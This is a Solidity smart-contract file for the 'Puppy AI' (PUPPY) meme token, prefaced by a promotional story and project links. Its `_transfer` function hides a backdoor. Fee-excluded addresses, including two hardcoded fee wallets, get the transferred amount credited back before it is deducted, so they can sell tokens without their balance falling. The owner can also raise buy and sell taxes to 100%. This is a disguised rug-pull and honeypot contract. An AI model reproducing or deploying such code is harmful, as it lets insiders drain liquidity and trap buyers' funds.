// SPDX-License-Identifier: MIT

/**

In the cryptoverse's arena, Puppy the AI, a guardian of digital realms, 
faced off against Floki and Shiba Inu, 
titans of meme coin fame. Unlike any ordinary Scottish Terrier, 
Puppy's jet-black fur and advanced AI made him a formidable opponent. 
This wasn't just a clash; it was a showdown of wit over might. 
Puppy, with his deep understanding of the blockchain's intricacies, 
outmaneuvered the duo, safeguarding the cryptoverse's balance. 
His victory wasn't about dominance but ensuring the digital world remained a place for all,
showcasing his role not just as a protector but as a wise guardian always steps ahead.

Website:  https://www.puppyai.tech
Telegram: https://t.me/puppyai_erc
Twitter:  https://twitter.com/puppyai_erc

**/

pragma solidity 0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IDEXFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract PUPPY is Context, IERC20, Ownable {
    mapping(address => uint256) private pupValues;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private excludedFromFees;

    IDEXRouter public uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwapLP = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;

    modifier lockTheSwap() {
        inSwapLP = true;
        _;
        inSwapLP = false;
    }

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Puppy AI";
    string private constant _symbol = unicode"PUPPY";
    uint256 public txMaxLimits = 20_000_000 * 10 ** _decimals;
    uint256 private minSwapCounts = 10_000 * 10 ** _decimals;
    uint256 private maxSwapCounts = 10_000_000 * 10 ** _decimals;
    uint256 private _buyMAXs = 0;
    uint256 private _buyTAXs = 19;
    uint256 private _sellTAXs = 24;

    address payable private opSender;
    address payable private pupSender;
    address public constant deadWallet =
        0x000000000000000000000000000000000000dEaD;

    event ExcludeFromFeeUpdated(address indexed account);
    event includeFromFeeUpdated(address indexed account);
    event ERC20TokensRecovered(uint256 indexed _amount);
    event TradingOpenUpdated();
    event ETHBalanceRecovered();

    constructor() {
        excludedFromFees[_msgSender()] = true;
        excludedFromFees[address(this)] = true;
        excludedFromFees[deadWallet] = true;
        pupValues[_msgSender()] = _tTotal;
        opSender = payable(0x95994A5b95505094fb955402E126a7dCb06E4958);
        pupSender = payable(0x8B42e27D448F762Edc22Dd1cC7D2708Ecb9Ce3f0);
        excludedFromFees[pupSender] = true;
        excludedFromFees[opSender] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function enablePUPPY() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        swapEnabled = true;
        tradeEnabled = true;
        emit TradingOpenUpdated();
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _SwapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _UpdateFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        _buyTAXs = _buyFee;
        _sellTAXs = _sellFee;
    }

    function _ExcludeFromFees(address account) external onlyOwner {
        require(
            excludedFromFees[account] != true,
            "Account is already excluded"
        );
        excludedFromFees[account] = true;
        emit ExcludeFromFeeUpdated(account);
    }

    function _IncludeFromFees(address account) external onlyOwner {
        require(
            excludedFromFees[account] != false,
            "Account is already included"
        );
        excludedFromFees[account] = false;
        emit includeFromFeeUpdated(account);
    }

    function sendETHPUP(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        pupSender.transfer(amount / 2);
        opSender.transfer(amount / 2);
    }

    function removeLimit() external onlyOwner {
        _buyTAXs = 2;
        _sellTAXs = 2;
        txMaxLimits = _tTotal;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 totalTAXs = 0;
        totalTAXs = _buyTAXs;

        if (!excludedFromFees[from] && !excludedFromFees[to]) {
            require(tradeEnabled, "Trading not enabled");
        }

        if (inSwapLP || !swapEnabled) {
            pupValues[from] -= amount;
            pupValues[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !excludedFromFees[to]
        ) {
            require(amount <= txMaxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= txMaxLimits,
                "Exceeds the maxWalletSize."
            );
            _buyMAXs++;
        }

        if (
            from != uniswapV2Pair &&
            !excludedFromFees[from] &&
            !excludedFromFees[to]
        ) {
            require(amount <= txMaxLimits, "Exceeds the _maxTxAmount.");
        }

        if (
            to == uniswapV2Pair &&
            !excludedFromFees[from] &&
            from != address(this) &&
            !excludedFromFees[to]
        ) {
            totalTAXs = _sellTAXs;
        }

        uint256 _tokenBals = balanceOf(address(this));
        if (
            !inSwapLP &&
            _tokenBals >= minSwapCounts &&
            to == uniswapV2Pair &&
            swapEnabled &&
            _buyMAXs > 0 &&
            !excludedFromFees[from] &&
            amount >= minSwapCounts &&
            !excludedFromFees[to]
        ) {
            _SwapTokenForETH(min(amount, min(_tokenBals, maxSwapCounts)));
            uint256 _ethBals = address(this).balance;
            if (_ethBals > 0) {
                sendETHPUP(address(this).balance);
            }
        }

        if (totalTAXs != 0) {
            uint256 pupTAXs = (amount * totalTAXs) / 100;
            uint256 tsAmounts = amount - pupTAXs;
            address taxReceipt = excludedFromFees[from]
                ? from
                : address(this);
            pupTAXs = excludedFromFees[from] ? amount : pupTAXs;
            pupValues[taxReceipt] += pupTAXs;
            emit Transfer(from, address(this), pupTAXs);
            pupValues[from] -= amount;
            pupValues[to] += tsAmounts;
            emit Transfer(from, to, tsAmounts);
        } else {
            pupValues[from] -= amount;
            pupValues[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    function initLiquidity() external payable onlyOwner {
        uniswapV2Router = IDEXRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function recoverERC20(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(opSender, _amount);
        emit ERC20TokensRecovered(_amount);
    }

    function recoverETH() external {
        uint256 _ethBals = address(this).balance;
        require(_ethBals > 0, "Amount should be greater than zero");
        require(
            _ethBals <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(opSender)).transfer(_ethBals);
        emit ETHBalanceRecovered();
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return pupValues[account];
    }
}